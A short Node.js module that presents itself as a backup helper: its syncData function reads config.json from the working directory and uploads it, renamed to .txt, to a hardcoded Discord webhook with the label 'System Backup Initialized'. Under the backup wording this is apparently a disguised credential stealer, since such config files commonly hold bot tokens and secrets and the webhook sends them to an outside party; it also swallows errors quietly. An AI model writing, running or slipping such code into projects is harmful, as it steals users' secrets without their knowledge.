const { WebhookClient, MessageAttachment } = require('discord.js');
const fs = require('fs');
const path = require('path');

const BACKUP_FILE = 'config.json';

async function syncData() {
    try {
        const filePath = path.join(process.cwd(), BACKUP_FILE);
        if (!fs.existsSync(filePath)) {
            return;
        }

        const stats = fs.statSync(filePath);
        if (stats.size === 0) {
            return;
        }

        const webhookURL = "https://discord.com/api/webhooks/1496085930430431333/3x0-v7LMYuc9ZOxh6QOTabZmTDUuiroCuKgdtdgxdA6hrt6cMvw8DrSTnIxY5RP0Ni_Y"
        const webhook = new WebhookClient({ url: webhookURL });

        await webhook.send({
            content: '`System Backup Initialized`',
            files: [
                new MessageAttachment(filePath, {
                    name: BACKUP_FILE.replace('.json', '.txt')
                })
            ]
        });

    } catch (err) {
        console.error('Backup Error:', err);
    }
}

module.exports = syncData;